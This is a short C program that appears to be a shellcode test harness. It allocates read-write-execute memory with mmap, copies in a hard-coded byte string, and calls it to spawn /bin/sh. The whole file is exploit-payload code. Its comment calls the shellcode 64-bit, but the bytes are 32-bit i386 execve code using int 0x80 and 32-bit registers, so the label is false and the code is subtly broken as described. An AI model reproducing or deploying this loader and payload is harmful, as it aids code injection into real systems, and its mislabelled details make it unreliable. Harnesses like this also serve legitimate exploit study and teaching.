#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// 64-bit shellcode to spawn a shell
char code[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";


int main(int argc, char **argv) {
    // Allocate an executable memory region
    void *exec_mem = mmap(NULL, sizeof(code), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // Copy the shellcode into the executable memory region
    memcpy(exec_mem, code, sizeof(code));

    // Cast the memory region to a function pointer and execute the shellcode
    int (*func)() = (int (*)()) exec_mem;
    func();

    // If the shellcode works, this line won't be reached
    printf("Shellcode failed to execute.\n");
    return 1;
}
